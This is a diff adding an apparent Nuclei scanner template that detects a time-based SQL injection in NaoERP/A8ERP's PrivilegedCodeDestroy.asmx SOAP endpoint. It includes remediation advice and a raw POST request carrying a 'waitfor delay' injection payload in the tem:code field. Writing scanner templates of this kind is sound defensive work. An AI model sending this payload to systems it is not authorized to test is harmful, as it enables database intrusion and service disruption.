@@ -1,0 +1,61 @@
+id: naoerp-privilegedcodedestroy-sqli
+
+info:
+  name: NaoERP / A8ERP PrivilegedCodeDestroy.asmx - SQL Injection (Time-based)
+  author: qwtd
+  severity: high
+  description: |
+    The NaoERP (also referenced in some reports as A8ERP/九佳易管理系统) SOAP endpoint
+    /Interface/licx/PrivilegedCodeDestroy.asmx (UpdatePrivilegedState) is vulnerable to SQL injection.
+    Attackers can inject SQL via the <tem:code> parameter and confirm exploitation using time-based delays (e.g., WAITFOR DELAY).
+  remediation: |
+    - Apply the vendor patch/upgrade to a fixed release (if available) or contact the vendor for a security update.
+    - Enforce strict input validation and parameterized queries for SOAP parameters (especially tem:code).
+    - Restrict public access to /Interface/licx/* endpoints (internal/admin network only) and add WAF rules to block SQLi payloads.
+    - Enable logging and monitor for repeated delay-based probes.
+  impact: |
+    Successful exploitation may allow attackers to read or modify database contents.
+    Time-based injection can also be abused to degrade service availability by forcing the database to sleep.
+  reference:
+    - https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  metadata:
+    vendor: naoerp
+    product: naoerp-erp
+    verified: true
+    max-request: 1
+  tags: 九佳易管理系统
+
+http:
+  - method: POST
+    raw:
+      - |
+        POST /Interface/licx/PrivilegedCodeDestroy.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        SOAPAction: http://tempuri.org/UpdatePrivilegedState
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:UpdatePrivilegedState>
+                 <!--type: string-->
+                 <tem:code>'waitfor delay'0:0:5</tem:code>
+              </tem:UpdatePrivilegedState>
+           </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "UpdatePrivilegedStateResponse"
